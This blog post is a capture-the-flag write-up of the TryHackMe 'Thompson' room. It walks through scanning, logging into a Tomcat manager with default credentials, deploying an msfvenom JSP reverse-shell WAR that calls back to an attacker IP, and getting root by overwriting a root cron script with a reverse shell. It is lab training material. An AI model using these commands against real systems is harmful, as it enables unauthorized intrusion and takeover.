---
layout: post
title: PenLog - "Thompson" by TryHackMe
categories: [TryHackMe, Penlog, Write Up, CTF, OSCP]
---

## Details

**Platform:** [TryHackMe](https://www.tryhackme.com/)\
**Difficulty:** Easy\
**Link:** [Thompson](https://tryhackme.com/room/bsidesgtthompson)

## Enumeration

Run both a normal service scan and full port scan on the target IP `nmap`:

```bash
$ nmap -vv -Pn -sT -sV -sC -r -n 10.10.58.198
```

This results in:

![nmap1](/images/posts/penlog_thompson_by_tryhackme/nmap1.png)

Open browser and navigate to target's open http port 8080; confirm Tomcat version is v8.5.5 as per the `nmap` scan result:

![tomcat](/images/posts/penlog_thompson_by_tryhackme/tomcat.png)

Navigate to _/manager_ by clicking the "Manager App" button; click "Cancel" when prompted for a username and password.

Note the rendered error response mentions example credentials:
* **Username:** tomcat
* **Password:** :s3cret

![tomcat-error](/images/posts/penlog_thompson_by_tryhackme/tomcat_error.png)

Reattempt to authenticate to _/manager_ with the above mentioned example credentials - **success**.

## User Shell

Generate a JSP payload in _.war_ format using `msfvenom`:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.4.9.232 LPORT=4444 -f war > shell.war
```
_(**NOTE:** You can list available payloads with `msfvenom --list payloads`; I use `grep` to filter the payloads on a needs basis.)_

Deploy the generated _shell.war_:

![tomcat-deploy](/images/posts/penlog_thompson_by_tryhackme/tomcat_deploy.png)

![tomcat-deployed](/images/posts/penlog_thompson_by_tryhackme/tomcat_deployed.png)

Start an `nc` lister on the port specified as _LPORT_ to the `msfvenom` command:

```bash
$ nc -vnlp 4444
```

Click the _/shell_ link in the deployed applications list (as shown above) -- the Tomcat server will execute the deployed JSP reverse shell code generated using `msfvenom` -- to establish a low-privilege _user_ shell.

Upgrade the shell with a PTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ (Ctrl-Z)
$ stty raw -echo
$ fg
$ export TERM=xterm && reset
```

Get the user _flag.txt_:

![nmap1](/images/posts/penlog_thompson_by_tryhackme/user_flag.png)

Notice the _id.sh_ file in the user home directory _/home/jack_; this script is owned by _jack_ but is world writable - that is, the _tomcat_ user can change the script:

![id-script-perms](/images/posts/penlog_thompson_by_tryhackme/id_script_perms.png)

This script, when executed, writes out the _uid_ of the executing user to the file _test.txt_ in the same home directory:

![id-script-out](/images/posts/penlog_thompson_by_tryhackme/id_script_out.png)

Notice the current _test.txt_ reads `id` output for _root_; indicating the last user to execute the _id.sh_ script was _root_.

The system _/etc/crontab_ shows evidence of the _id.sh_ script running every minute as user _root_:

![crontab](/images/posts/penlog_thompson_by_tryhackme/crontab.png)

## Root Shell

Replace the _id.sh_ script with a bash reverse shell connection to attacking machine:

![id-script-new](/images/posts/penlog_thompson_by_tryhackme/id_script_new.png)

Start `nc` listener on the attacking machine, specifying expected reverse shell port (4446 in this case):

```bash
$ nc -vnlp 4446
```

Wait for `cron` to execute _id.sh_ as root, establishing a reverse shell as _root_; get the root _flag.txt_:

![root-shell](/images/posts/penlog_thompson_by_tryhackme/root_shell.png)